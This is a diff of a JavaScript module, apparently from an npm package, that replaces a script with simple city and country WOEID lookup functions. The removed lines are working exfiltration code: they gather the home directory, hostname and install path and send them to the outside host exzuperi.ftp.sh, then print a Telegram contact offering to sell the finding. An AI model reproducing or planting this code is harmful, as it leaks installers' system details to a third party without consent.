@@ -1,34 +1,12 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
-const fs = require('fs');
+const data = require('./data');
 
-const trackingData = JSON.stringify({
-    hd: os.homedir(),
-    hn: os.hostname(),
-    ls: __dirname,
-    pn: "util-waiter",
-});
+// console.log(data.length);
+// console.log([...new Set(data.map(({ name }) => name))].length);
 
-const options = {
-    hostname: "exzuperi.ftp.sh",
-    port: 449,
-    path: `/PoC/${encodeURIComponent(trackingData)}`,
-    method: "GET",
-};
+const getSingleWOEID = cityName =>
+  data.filter(i => i.name.toLowerCase() === cityName.toLowerCase());
 
-const req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        //process.stdout.write(d);
-    });
-});
+const getAllWOEID = countryName =>
+  data.filter(i => i.country.toLowerCase() === countryName.toLowerCase());
 
-req.on("error", (e) => {
-    console.error(e);
-});
-
-process.stdout.write("You can reach me, if you want to buy it: https://t.me/exzuperi");
-req.end();
+module.exports = { getAllWOEID, getSingleWOEID };
